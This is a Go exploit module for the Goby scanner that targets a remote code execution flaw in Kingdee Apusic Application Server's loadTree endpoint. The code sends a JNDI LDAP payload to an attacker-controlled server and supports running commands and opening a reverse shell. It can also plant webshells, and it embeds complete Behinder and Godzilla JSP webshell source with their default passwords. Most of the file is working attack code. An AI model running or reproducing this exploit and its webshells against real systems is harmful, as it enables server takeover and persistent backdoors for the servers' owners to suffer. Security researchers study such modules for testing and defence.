package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apusic Application Server loadTree Remote Code Execution Vulnerability",
    "Description": "<p>Kingdee Apusic Application Server (AAS) is an enterprise-level application server software that is efficient, secure, integrated and has rich functions. It fully supports the technical specifications of JakartaEE 8/9 and provides Web containers and EJB containers that meet the specifications. And WebService containers, etc., support the latest technical specifications such as Websocket 1.1, Servlet4.0, HTTP 2.0, etc., providing key support for the convenient development, flexible deployment, reliable operation, efficient management and control, and rapid integration of enterprise-level applications.</p><p>The Kingdee Apusic Application Server (AAS) has a File Upload vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Apusic-Application-Server",
    "Homepage": "https://www.apusic.com/list-117.html",
    "DisclosureDate": "2023-12-07",
    "PostTime": "2023-12-20",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "body=\"images/head_right_filling.jpg\" || body=\"/admin/protected/index.jsp\" || server=\"Apusic Application Server\"",
    "GobyQuery": "body=\"images/head_right_filling.jpg\" || body=\"/admin/protected/index.jsp\" || server=\"Apusic Application Server\"",
    "Level": "3",
    "Impact": "<p>The Kingdee Apusic Application Server (AAS) has a File Upload vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a vulnerability fix, please stay tuned for updates:<a href=\"https://www.apusic.com/list-117.html\">https://www.apusic.com/list-117.html</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test98765X.jsp",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(123); %>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Apusic 应用服务器 loadTree 远程代码执行漏洞",
            "Product": "Apusic-Application-Server",
            "Description": "<p>金蝶 Apusic 应用服务器（Apusic Application Server，AAS）是一款标准、安全、高效、集成并具丰富功能的企业级应用服务器软件，全面支持 JakartaEE 8/9的技术规范，提供满足该规范的 Web 容器、 EJB 容器以及 WebService 容器等，支持 Websocket 1.1、Servlet4.0、HTTP 2.0等最新的技术规范，为企业级应用的便捷开发、灵活部署、可靠运行、高效管控以及快速集成等提供关键支撑。</p><p>金蝶 Apusic 应用服务器（Apusic Application Server，AAS）存在代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.apusic.com/list-117.html\" target=\"_blank\">https://www.apusic.com/list-117.html</a><br></p>",
            "Impact": "<p>金蝶 Apusic 应用服务器（Apusic Application Server，AAS）存在代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Apusic Application Server loadTree Remote Code Execution Vulnerability",
            "Product": "Apusic-Application-Server",
            "Description": "<p>Kingdee Apusic Application Server (AAS) is an enterprise-level application server software that is efficient, secure, integrated and has rich functions. It fully supports the technical specifications of JakartaEE 8/9 and provides Web containers and EJB containers that meet the specifications. And WebService containers, etc., support the latest technical specifications such as Websocket 1.1, Servlet4.0, HTTP 2.0, etc., providing key support for the convenient development, flexible deployment, reliable operation, efficient management and control, and rapid integration of enterprise-level applications.</p><p>The Kingdee Apusic Application Server (AAS) has a File Upload vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a vulnerability fix, please stay tuned for updates:<a href=\"https://www.apusic.com/list-117.html\" target=\"_blank\">https://www.apusic.com/list-117.html</a><br></p>",
            "Impact": "<p>The Kingdee Apusic Application Server (AAS) has a File Upload vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10898"
}`

	sendPayloadXOIUWRNDXCOOOWQE := func(hostInfo *httpclient.FixUrl, uriIndex, cmd, registerId, ldapAddress string) (*httpclient.HttpResponse, error) {
		postRequestConfig := httpclient.NewPostRequestConfig(uriIndex + "//protect/jndi/loadTree")
		postRequestConfig.Header.Store("cmd", cmd)
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Header.Store("Accept", "*/*")
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		postRequestConfig.Header.Store("Referer", hostInfo.FixedHostInfo)
		postRequestConfig.Data = "jndiName=" + ldapAddress
		return httpclient.DoHttpRequest(hostInfo, postRequestConfig)
	}

	executePayloadPXOIOWEOWQEII := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		for _, uriIndex := range []string{"/admin", "/appmonitor"} {
			registerId := goutils.RandomHexString(16)
			resp, err := sendPayloadXOIUWRNDXCOOOWQE(hostInfo, uriIndex, cmd, registerId, "ldap://"+godclient.GetGodServerHost()+"/A7")
			if err != nil {
				return nil, err
			} else if resp != nil && resp.StatusCode == 200 && !strings.Contains(resp.RawBody, "addDSButtonbar") {
				return resp, nil
			}
		}
		return nil, errors.New("漏洞利用失败")
	}

	checkFileXOIUWRNDWQPOEISDA := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/" + filename)
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(6)
			resp, _ := executePayloadPXOIOWEOWQEII(hostInfo, "echo "+checkString)
			return resp != nil && strings.Contains(resp.RawBody, checkString)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "cmd" {
				cmd := goutils.B2S(ss.Params["cmd"])
				resp, err := executePayloadPXOIOWEOWQEII(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp.StatusCode == 200 && len(resp.Utf8Html) > 0 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_java", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				cmd := fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp)
				_, err = executePayloadPXOIOWEOWQEII(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "webshell" {
				var content string
				filename := goutils.RandomHexString(6) + ".jsp"
				if webshell == "behinder" {
					/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
				} else {
					content = ss.Params["content"].(string)
					filename = goutils.B2S(ss.Params["filename"])
				}
				_, err := executePayloadPXOIOWEOWQEII(expResult.HostInfo, fmt.Sprintf("$$$$$./applications/default/public_html/"+filename+":"+base64.StdEncoding.EncodeToString([]byte(content))))
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				checkResponse, err := checkFileXOIUWRNDWQPOEISDA(expResult.HostInfo, filename)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				} else if checkResponse != nil && (checkResponse.StatusCode == 200 || checkResponse.StatusCode == 500) {
					expResult.Success = true
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + checkResponse.Request.URL.Path + "\n"
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
					expResult.Output += "Webshell type: jsp"
				}

			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
